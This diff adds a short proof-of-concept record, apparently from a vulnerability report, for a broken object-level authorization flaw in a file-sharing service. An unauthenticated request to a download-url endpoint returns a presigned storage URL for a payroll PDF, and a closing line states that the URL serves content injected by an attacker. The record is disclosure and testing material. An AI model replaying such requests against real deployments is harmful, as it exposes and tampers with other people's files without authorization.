@@ -1,0 +1,12 @@
+REQUEST (unauthenticated):
+GET /files/download-url?objectName=cmujl55ie0000qs0ovmyxqltb/1790499633225-6sb6yp-payroll-2026.pdf HTTP/1.1
+Host: localhost:3333
+
+RESPONSE: HTTP/1.1 200 OK
+{
+    "url": "http://localhost:9379/palmr-files/cmujl55ie0000qs0ovmyxqltb/1790499633225-6sb6yp-payroll-2026.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=palmr-minio-admin%2F20260927%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20260927T090157Z&X-Amz-Expires=3600&X-Amz-Signature=9c71dc44d7119672def495e7e235424ad347a28fb9480fa5d97bcdfdf61e51d4&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3D%22payroll-2026.%22%3B%20filename%2A%3DUTF-8%27%27payroll-2026.&response-content-type=application%2Foctet-stream&x-amz-checksum-mode=ENABLED&x-id=GetObject",
+    "expiresIn": 3600
+}
+
+--- Following the returned download URL (unauthenticated) serves: ---
+MALICIOUS CONTENT injected by an UNAUTHENTICATED attacker via reverse-share presigned-url BOLA
